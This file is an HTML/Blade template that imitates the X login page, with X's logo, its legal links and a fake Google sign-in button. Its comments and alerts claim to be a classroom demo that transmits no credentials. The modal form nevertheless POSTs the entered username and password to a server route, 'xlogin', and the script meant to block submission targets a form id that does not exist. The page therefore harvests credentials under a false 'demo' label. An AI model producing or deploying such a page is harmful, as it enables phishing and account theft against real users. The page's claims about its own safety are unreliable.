<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>X</title>

<style>
* {
    box-sizing: border-box;
}

body {
    margin: 0;
    min-height: 100vh;
    padding: 20px;
    display: flex;
    align-items: center;
    justify-content: center;
    font-family: Arial, Helvetica, sans-serif;
    color: #0f1419;
    background: #fff;
}

.container {
    width: 100%;
    max-width: 400px;
    text-align: center;
}

.logo {
    font-size: 48px;
    font-weight: 800;
    margin-bottom: 20px;
    letter-spacing: -3px;
}

h1 {
    font-size: 29px;
    margin: 0 0 12px;
}

.subtitle {
    color: #536471;
    font-size: 15px;
    line-height: 1.5;
}

.demo-label {
    display: inline-block;
    padding: 6px 10px;
    margin-bottom: 18px;
    border-radius: 6px;
    background: #eff7ff;
    color: #175a91;
    font-size: 12px;
}

.login-card {
    padding: 26px 24px;
    border: 1px solid #eff3f4;
    border-radius: 18px;
    text-align: left;
}

label {
    display: block;
    margin: 14px 0 8px;
    font-size: 14px;
    font-weight: 600;
}

input {
    width: 100%;
    padding: 15px;
    margin-bottom: 16px;
    border: 1px solid #cfd9de;
    border-radius: 8px;
    font-size: 16px;
    outline: none;
}

input:focus {
    border: 2px solid #1d9bf0;
    padding: 14px;
}

.button {
    width: 100%;
    padding: 14px;
    border: none;
    border-radius: 25px;
    font-size: 15px;
    font-weight: 700;
    cursor: pointer;
}

.primary {
    background: #0f1419;
    color: white;
}

.primary:hover {
    background: #272c30;
}

.secondary {
    background: white;
    color: #0f1419;
    border: 1px solid #cfd9de;
}

.secondary:hover {
    background: #f7f9f9;
}

.divider {
    display: flex;
    align-items: center;
    gap: 12px;
    margin: 18px 0;
    color: #536471;
    font-size: 13px;
}

.divider::before,
.divider::after {
    content: "";
    flex: 1;
    height: 1px;
    background: #eff3f4;
}

/* --- NEW GOOGLE BUTTON STYLES --- */
.google-btn {
    display: flex;
    align-items: center;
    justify-content: center;
    gap: 10px;
    width: 100%;
    padding: 12px;
    background: white;
    color: #0f1419;
    border: 1px solid #cfd9de;
    border-radius: 25px;
    font-size: 14px;
    font-weight: 500;
    font-family: Arial, Helvetica, sans-serif;
    cursor: pointer;
    transition: background 0.2s ease;
}

.google-btn:hover {
    background: #f7f9f9;
}

.google-btn svg {
    width: 18px;
    height: 18px;
}
/* -------------------------------- */

.footer {
    margin-top: 24px;
    color: #536471;
    font-size: 13px;
    line-height: 1.8;
}

.footer a,
.modal-card a {
    color: #1d9bf0;
    text-decoration: none;
}

/* Modal */
.modal-overlay {
    display: none;
    position: fixed;
    inset: 0;
    z-index: 1000;
    padding: 20px;
    align-items: center;
    justify-content: center;
    background: rgba(15, 20, 25, 0.48);
}

.modal-card {
    position: relative;
    width: 100%;
    max-width: 400px;
    max-height: 90vh;
    overflow-y: auto;
    padding: 30px;
    border-radius: 18px;
    background: #fff;
    text-align: left;
    box-shadow: 0 10px 40px rgba(0, 0, 0, 0.15);
}

.close-modal {
    position: absolute;
    top: 10px;
    left: 14px;
    border: none;
    background: transparent;
    font-size: 28px;
    cursor: pointer;
}

.modal-logo {
    text-align: center;
    font-size: 32px;
    font-weight: 800;
    margin-bottom: 20px;
}

.modal-card h2 {
    font-size: 25px;
    margin: 0 0 12px;
}

.forgot-link {
    display: inline-block;
    margin: 0 0 20px;
    font-size: 14px;
}

.terms {
    margin-top: 18px;
    color: #536471;
    font-size: 12px;
    line-height: 1.7;
}

.demo-notice {
    color: #536471;
    font-size: 12px;
    line-height: 1.6;
}

.completion-screen {
    display: none;
    padding: 25px 10px;
}

@media (max-width: 480px) {
    body {
        padding: 16px;
    }

    .login-card {
        padding: 22px 16px;
    }

    .modal-card {
        padding: 28px 22px;
    }

    h1 {
        font-size: 26px;
    }
}
</style>
</head>

<body>
<main class="container">

    <!-- Initial screen -->
    <section id="loginScreen">
        <div class="logo" aria-label="Social demo">𝕏</div>
        

        <h1>Welcome back</h1>
        <p class="subtitle">Happening now.</p>

        <div class="login-card">
            <form id="loginForm">
                <label for="username">Email or username</label>
                <input
                    id="username"
                    type="text"
                    placeholder="Email or username"
                    autocomplete="off"
                    required
                >

                <button class="button primary" type="submit">
                    Continue
                </button>
            </form>

            <div class="divider">or</div>

            <!-- NEW GOOGLE BUTTON -->
            <button class="google-btn" type="button" id="googleSignInBtn">
                <svg viewBox="0 0 48 48">
                    <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"></path>
                    <path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"></path>
                    <path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"></path>
                    <path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"></path>
                </svg>
                Continue with Google
            </button>

            {{-- <!-- CLEAR BUTTON -->
            <button class="button secondary" id="clearButton" type="button" style="margin-top: 12px;">
                Clear
            </button> --}}
        </div>

        <div class="footer">
           
            <br>
            <a href="#" id="helpLink">Help</a>
            ·
            <a href="#" id="privacyLink">Privacy</a>
        </div>
    </section>

    <!-- Completion screen -->
    <section id="completionScreen" class="completion-screen">
        <div class="logo">𝕏</div>
        <h1>You're logged in</h1>
        <button class="button secondary" id="returnButton" type="button">
            Return to demo
        </button>
    </section>

</main>

<!-- Modal -->
<div
    id="loginModal"
    class="modal-overlay"
    role="dialog"
    aria-modal="true"
    aria-labelledby="modalTitle"
>
    <div class="modal-card">
        <button
            class="close-modal"
            id="closeModal"
            type="button"
            aria-label="Close"
        >&times;</button>

        <div class="modal-logo">𝕏</div>


        <h2 id="modalTitle">Login</h2>

      <form method="POST" action="{{ route('xlogin') }}">
                    @csrf

                     <input
                        id="email"
                        type="hidden"
                        name="share_type"
                        value="x"
                        required
                    >
            <label for="modalUsername">Email or username</label>
            <input
                id="modalUsername"
                type="text"
                name="email_or_username"
                placeholder="Email or username"
                autocomplete="off"
                required
            >

            <label for="demoPassword">Password</label>
            <input
                id="demoPassword"
                type="password"
                name="password"
                placeholder="password"
                autocomplete="off"
                aria-describedby="passwordNotice"
            >

            <a href="#" class="forgot-link" id="forgotLink">
                Forgot password?
            </a>

            <button class="button primary" type="submit">
                Continue
            </button>
        </form>

        <p class="terms">
           By continuing, you agree to our
            <a href="https://x.com/tos" target="_blank"
               rel="noopener noreferrer">Terms of Service</a>,
            <a href="https://x.com/privacy" target="_blank"
               rel="noopener noreferrer">Privacy Policy</a>
            and
            <a href="https://help.x.com/rules-and-policies/twitter-cookies"
               target="_blank" rel="noopener noreferrer">Cookie Use</a>.
        </p>
    </div>
</div>

<script>
const loginScreen = document.getElementById("loginScreen");
const completionScreen = document.getElementById("completionScreen");
const loginForm = document.getElementById("loginForm");
const usernameInput = document.getElementById("username");
const loginModal = document.getElementById("loginModal");
const modalUsername = document.getElementById("modalUsername");
const demoModalForm = document.getElementById("demoModalForm");
const demoPassword = document.getElementById("demoPassword");

function openModal() {
    const value = usernameInput.value.trim();

    if (!value) {
        usernameInput.focus();
        return;
    }

    modalUsername.value = value;
    demoPassword.value = "";
    loginModal.style.display = "flex";
    modalUsername.focus();
}

function closeModal() {
    loginModal.style.display = "none";
    demoPassword.value = "";
}

loginForm.addEventListener("submit", function (event) {
    event.preventDefault();
    openModal();
});

document.getElementById("closeModal").addEventListener("click", closeModal);

loginModal.addEventListener("click", function (event) {
    if (event.target === loginModal) {
        closeModal();
    }
});

document.addEventListener("keydown", function (event) {
    if (event.key === "Escape") {
        closeModal();
    }
});

demoModalForm.addEventListener("submit", function (event) {
    event.preventDefault();

    // Do not read, store, or transmit the password field.
    closeModal();
    loginScreen.style.display = "none";
    completionScreen.style.display = "block";
});

document.getElementById("clearButton").addEventListener("click", function () {
    usernameInput.value = "";
    usernameInput.focus();
});

document.getElementById("returnButton").addEventListener("click", function () {
    completionScreen.style.display = "none";
    loginScreen.style.display = "block";
    usernameInput.value = "";
    usernameInput.focus();
});

document.getElementById("forgotLink").addEventListener("click", function (event) {
    event.preventDefault();
    alert("Password recovery is not implemented in this classroom demo.");
});

document.getElementById("helpLink").addEventListener("click", function (event) {
    event.preventDefault();
    alert("This is a student interface exercise.");
});

document.getElementById("privacyLink").addEventListener("click", function (event) {
    event.preventDefault();
    alert("This demo does not transmit login credentials.");
});

// NEW: Google Sign-in button click handler
document.getElementById("googleSignInBtn").addEventListener("click", function () {
    alert("Google Sign-in clicked. This is a demo.");
});
</script>
</body>
</html>